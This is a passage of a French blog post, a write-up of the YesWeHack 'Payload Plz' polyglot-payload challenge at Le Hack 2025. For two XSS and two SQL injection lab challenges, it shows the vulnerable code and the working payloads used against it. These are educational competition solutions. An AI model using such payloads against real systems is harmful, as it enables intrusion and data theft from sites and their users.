@@ -1,0 +1,1157 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="fr">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Payload Plz - Analyse Du Challenge Yes We Hack - La sécurité à la française</title><meta name="author" content="Driikolu">
+<meta name="description" content="
+Du 27 au 29 Juin 2025 s&rsquo;est tenu Le Hack, à la cité des sciences de Paris. Pour l&rsquo;occasion, des centaines de professionnels de la sécurité, d&rsquo;étudiants ou de simples curieux, se sont réunis pour parler de Hacking, d&rsquo;OSINT, et de sécurité.
+Comme chaque année, de nombreuses entreprises, écoles, associations ou entités publiques étaient présentes. Notamment YesWeHack qui cette année a proposé un petit challenge pour le moins intéréssant et qui vaut la peine d&rsquo;être décortiquer.
+One Payload to rule them all Le challenge, affectueusement nommé &ldquo;Payload Plz&rdquo; (Ou comme nos amis Québécois diraient &ldquo;Charge utile Svp&rdquo;), a un principe simple : Il y a 13 petits challenges en tout genre (SQLi, SSTI, XSS, &hellip;) et nous devons en résoudre le plus possible avec 1 seule et même payload, et la plus courte possible. Notre payload nous donnera un score calculé ainsi :
+"><meta name="keywords" content='Hugo, FixIt'>
+  <meta itemprop="name" content="Payload Plz - Analyse du challenge Yes We Hack">
+  <meta itemprop="description" content="Du 27 au 29 Juin 2025 s’est tenu Le Hack, à la cité des sciences de Paris. Pour l’occasion, des centaines de professionnels de la sécurité, d’étudiants ou de simples curieux, se sont réunis pour parler de Hacking, d’OSINT, et de sécurité.
+Comme chaque année, de nombreuses entreprises, écoles, associations ou entités publiques étaient présentes. Notamment YesWeHack qui cette année a proposé un petit challenge pour le moins intéréssant et qui vaut la peine d’être décortiquer.
+One Payload to rule them all Le challenge, affectueusement nommé “Payload Plz” (Ou comme nos amis Québécois diraient “Charge utile Svp”), a un principe simple : Il y a 13 petits challenges en tout genre (SQLi, SSTI, XSS, …) et nous devons en résoudre le plus possible avec 1 seule et même payload, et la plus courte possible. Notre payload nous donnera un score calculé ainsi :">
+  <meta itemprop="datePublished" content="2025-07-06T15:51:41+00:00">
+  <meta itemprop="dateModified" content="2025-07-11T11:49:04+02:00">
+  <meta itemprop="wordCount" content="5270"><meta property="og:url" content="https://driikolu.fr/posts/payload-plz/">
+  <meta property="og:site_name" content="La sécurité à la française">
+  <meta property="og:title" content="Payload Plz - Analyse du challenge Yes We Hack">
+  <meta property="og:description" content="Du 27 au 29 Juin 2025 s’est tenu Le Hack, à la cité des sciences de Paris. Pour l’occasion, des centaines de professionnels de la sécurité, d’étudiants ou de simples curieux, se sont réunis pour parler de Hacking, d’OSINT, et de sécurité.
+Comme chaque année, de nombreuses entreprises, écoles, associations ou entités publiques étaient présentes. Notamment YesWeHack qui cette année a proposé un petit challenge pour le moins intéréssant et qui vaut la peine d’être décortiquer.
+One Payload to rule them all Le challenge, affectueusement nommé “Payload Plz” (Ou comme nos amis Québécois diraient “Charge utile Svp”), a un principe simple : Il y a 13 petits challenges en tout genre (SQLi, SSTI, XSS, …) et nous devons en résoudre le plus possible avec 1 seule et même payload, et la plus courte possible. Notre payload nous donnera un score calculé ainsi :">
+  <meta property="og:locale" content="fr">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-07-06T15:51:41+00:00">
+    <meta property="article:modified_time" content="2025-07-11T11:49:04+02:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Payload Plz - Analyse du challenge Yes We Hack">
+  <meta name="twitter:description" content="Du 27 au 29 Juin 2025 s’est tenu Le Hack, à la cité des sciences de Paris. Pour l’occasion, des centaines de professionnels de la sécurité, d’étudiants ou de simples curieux, se sont réunis pour parler de Hacking, d’OSINT, et de sécurité.
+Comme chaque année, de nombreuses entreprises, écoles, associations ou entités publiques étaient présentes. Notamment YesWeHack qui cette année a proposé un petit challenge pour le moins intéréssant et qui vaut la peine d’être décortiquer.
+One Payload to rule them all Le challenge, affectueusement nommé “Payload Plz” (Ou comme nos amis Québécois diraient “Charge utile Svp”), a un principe simple : Il y a 13 petits challenges en tout genre (SQLi, SSTI, XSS, …) et nous devons en résoudre le plus possible avec 1 seule et même payload, et la plus courte possible. Notre payload nous donnera un score calculé ainsi :">
+      <meta name="twitter:site" content="@driikolu">
+<meta name="twitter:creator" content="@driikolu" /><meta name="application-name" content="Hugo FixIt Blog">
+<meta name="apple-mobile-web-app-title" content="Hugo FixIt Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://driikolu.fr/posts/payload-plz/" title="Payload Plz - Analyse du challenge Yes We Hack - La sécurité à la française" /><link rel="prev" type="text/html" href="https://driikolu.fr/posts/word_worker_wu/" title="BreizhCTF 2022 - Word Worker" /><link rel="alternate" type="text/markdown" href="https://driikolu.fr/posts/payload-plz/index.md" title="Payload Plz - Analyse du challenge Yes We Hack - La sécurité à la française"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Payload Plz - Analyse du challenge Yes We Hack",
+    "inLanguage": "fr",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/driikolu.fr\/posts\/payload-plz\/"
+    },"genre": "posts","wordcount":  5270 ,
+    "url": "https:\/\/driikolu.fr\/posts\/payload-plz\/","datePublished": "2025-07-06T15:51:41+00:00","dateModified": "2025-07-11T11:49:04+02:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Driikolu"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="La sécurité à la française"><img class="logo" src='favicon.ico' alt="La sécurité à la française" height="32" width="32"><span class="header-title-text">La sécurité à la française</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Rechercher des titres, des contenus..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Chercher">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Effacer">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Changer de Thème">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="La sécurité à la française"><img class="logo" src='favicon.ico' alt="La sécurité à la française" height="26" width="26"><span class="header-title-text">La sécurité à la française</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Rechercher des titres, des contenus..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Chercher">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Effacer">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Annuler
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Changer de Thème"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Payload Plz - Analyse Du Challenge Yes We Hack</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="https://x.com/driikolu" title="Auteur"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img class="avatar" src='https://driikolu.fr/img/sloth.jpg' alt="Driikolu" height="16" width="16">&nbsp;Driikolu</a></span></div><div class="post-meta-line"><span title="publié le 2025-07-06 15:51:41"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-07-06">2025-07-06</time></span>&nbsp;<span title="Mis à jour le 2025-07-11 11:49:04"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-07-11">2025-07-11</time></span>&nbsp;<span title="5270 mots"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>environ 5300 mots</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>25 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contenus</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#xss-1">XSS 1</a></li>
+    <li><a href="#xss-2">XSS 2</a></li>
+    <li><a href="#sql-injection-1">SQL Injection 1</a></li>
+    <li><a href="#sql-injection-2">SQL Injection 2</a></li>
+    <li><a href="#xpath-injection">XPath Injection</a></li>
+    <li><a href="#jinja-ssti">Jinja SSTI</a></li>
+    <li><a href="#brainfuck">Brainfuck</a></li>
+    <li><a href="#erb-ssti">ERB SSTI</a></li>
+    <li><a href="#twig-ssti">Twig SSTI</a></li>
+    <li><a href="#smarty-ssti">Smarty SSTI</a></li>
+    <li><a href="#bash">Bash</a></li>
+    <li><a href="#xxe">XXE</a></li>
+    <li><a href="#path-traversal">Path Traversal</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#le-début-du-commencement">Le début du commencement</a></li>
+    <li><a href="#la-ssti-jinja2">La SSTI Jinja2</a></li>
+    <li><a href="#la-1ère-injection-sql">La 1ère Injection SQL</a></li>
+    <li><a href="#et-la-2nde-injection-sql">Et la 2nde Injection SQL</a></li>
+    <li><a href="#la-path-traversal">La Path Traversal</a></li>
+    <li><a href="#erb">ERB</a></li>
+    <li><a href="#smarty">Smarty</a></li>
+    <li><a href="#twig">Twig</a></li>
+    <li><a href="#xpath">Xpath</a></li>
+    <li><a href="#ajouter-les-xss-">Ajouter les XSS ?</a>
+      <ul>
+        <li><a href="#dune-payload-deux-xss">D&rsquo;une payload, deux XSS</a></li>
+        <li><a href="#les-sqli">Les SQLi</a></li>
+        <li><a href="#le-nfkc">Le NFKC</a></li>
+        <li><a href="#xss--sqli">XSS + SQLi</a></li>
+      </ul>
+    </li>
+    <li><a href="#le-brainfuck">Le Brainfuck</a></li>
+    <li><a href="#la-xxe">La XXE</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p><img loading="lazy" src='/img/payloadplz.png' alt="Logo PayloadPlz"></p>
+<p>Du 27 au 29 Juin 2025 s&rsquo;est tenu Le Hack, à la cité des sciences de Paris.
+Pour l&rsquo;occasion, des centaines de professionnels de la sécurité, d&rsquo;étudiants ou de simples curieux, se sont réunis pour parler de Hacking, d&rsquo;OSINT, et de sécurité.</p>
+<p>Comme chaque année, de nombreuses entreprises, écoles, associations ou entités publiques étaient présentes. Notamment YesWeHack qui cette année a proposé un petit challenge pour le moins intéréssant et qui vaut la peine d&rsquo;être décortiquer.</p>
+<h2 class="heading-element" id="one-payload-to-rule-them-all"><span>One Payload to rule them all</span>
+  <a href="#one-payload-to-rule-them-all" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Le challenge, affectueusement nommé &ldquo;<a href="https://payload-plz.com/"target="_blank" rel="external nofollow noopener noreferrer">Payload Plz</a>&rdquo; (Ou comme nos amis Québécois diraient &ldquo;Charge utile Svp&rdquo;), a un principe simple :
+Il y a 13 petits challenges en tout genre (SQLi, SSTI, XSS, &hellip;) et nous devons en résoudre le plus possible avec 1 seule et même payload, et la plus courte possible.
+Notre payload nous donnera un score calculé ainsi :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">score</span> <span class="o">=</span> <span class="p">(</span><span class="n">nombre</span> <span class="n">de</span> <span class="n">challenges</span> <span class="n">résolus</span> <span class="err">×</span> <span class="mi">1000</span><span class="p">)</span> <span class="err">−</span> <span class="n">taille</span> <span class="n">de</span> <span class="n">la</span> <span class="n">payload</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Le challenge n&rsquo;a duré que 2 jours, en parallèle des conférences, accessibles à tous.</p>
+<p>Je suis personnellement arrivé 10ème, avec une payload de 356 caractères permettant de résoudre 12 des 13 challenges.</p>
+<p>L&rsquo;objectif de ce blogpost sera donc de voir comment je suis arrivé à cette payload puis d&rsquo;analyser celle de ceux arrivés plus haut dans le classement.</p>
+<p><em>Nota bene</em> : Les payloads que j&rsquo;ai utilisé ne sont clairement pas les plus courtes, mais par soucis de transparence je les présenterais telles quelles.</p>
+<h2 class="heading-element" id="les-13-challenges-individuellement"><span>Les 13 challenges individuellement</span>
+  <a href="#les-13-challenges-individuellement" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>La première étape, pour bien commencer, est de résoudre tous les challenges individuellement. Cela nous permettra d&rsquo;avoir une base sur laquelle travailler notre payload.</p>
+<p>À savoir par avance que tous les challenges sont &ldquo;à l&rsquo;aveugle&rdquo;. Nous n&rsquo;aurons jamais la sortie, qu&rsquo;il y ai une erreur ou non. Notre seule information étant si la paylaod a résolu le challenge, c&rsquo;est à dire si le flag apparait dans la sortie.</p>
+<h2 class="heading-element" id="xss-1"><span>XSS 1</span>
+  <a href="#xss-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Pour ce challenge, il fallait déclencher un appel à <code>alert(flag)</code> par un bot chromium à jour.
+Aucune protection n&rsquo;était appliquée et notre payload était injectée dans le code suivant (à la place de <code>$INPUT</code>):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Hello $INPUT<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>La manière la plus simple pour celle-ci étant de simplement ajouter une balise <code>&lt;script&gt;</code> contenant notre code javacript.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nx">flag</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>On test. Le challenge est résolu. On passe au suivant.</p>
+<h2 class="heading-element" id="xss-2"><span>XSS 2</span>
+  <a href="#xss-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Seconde XSS où l&rsquo;objectif est le même : <code>alert(flag)</code>. Cependant le code est différent :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="kr">const</span> <span class="nx">x</span> <span class="o">=</span> <span class="s1">&#39;$INPUT&#39;</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ici, nous somme directement dans une balise script. Il faut sortir de la string, executer notre <em>alert</em> et terminer le code proprement.
+Voici une solution :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="err">&#39;</span><span class="p">;</span> <span class="nx">alert</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span><span class="o">/*</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Le commentaire à la fin de la payload permet d&rsquo;ignorer totalement la <em>quote</em> et donc de rendre le code valide.</p>
+<h2 class="heading-element" id="sql-injection-1"><span>SQL Injection 1</span>
+  <a href="#sql-injection-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>On change de type de vulnérabilité avec les injections SQL.
+On nous fourni cette fois le schéma de base de données avec l&rsquo;instruction de lire la colonne <code>flag</code> de la table <code>flag</code> :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="p">(</span><span class="n">username</span><span class="w"> </span><span class="nb">TEXT</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="nb">TEXT</span><span class="p">,</span><span class="w"> </span><span class="n">age</span><span class="w"> </span><span class="nb">INTEGER</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="p">(</span><span class="n">flag</span><span class="w"> </span><span class="nb">TEXT</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Et encore une fois le code (enfin la requête) dans lequel nous devons injecter :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;$INPUT&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nous avons cependant quelques informations en plus :</p>
+<ul>
+<li>La payload n&rsquo;est toujours pas &ldquo;nettoyée&rdquo;</li>
+<li>La DBMS est SQLite3</li>
+<li>La payload est normalisée en NFKC</li>
+</ul>
+<p>Mais pas besoin de savoir tout cela pour trouver une payload directement :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT 1,2,flag FROM flag;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Et on termine par un point virgule <code>;</code> afin de terminer la requête et d&rsquo;éviter les erreurs, la quote d&rsquo;après étant ignorée.</p>
+<h2 class="heading-element" id="sql-injection-2"><span>SQL Injection 2</span>
+  <a href="#sql-injection-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Globalement ce challenge est exactement le même que le précédent à une seule différence : notre input n&rsquo;est pas entrée en <em>string</em> (Elle n&rsquo;est pas entre <em>quotes</em>) :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">age</span><span class="w"> </span><span class="o">&lt;</span><span class="err">$</span><span class="k">INPUT</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nous sommes ici aussi sur une solution relativement simple :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="mi">1</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Et cette fois, pas besoin de commentaire ou de point virgule, la requête sera valide telle quelle.</p>
+<h2 class="heading-element" id="xpath-injection"><span>XPath Injection</span>
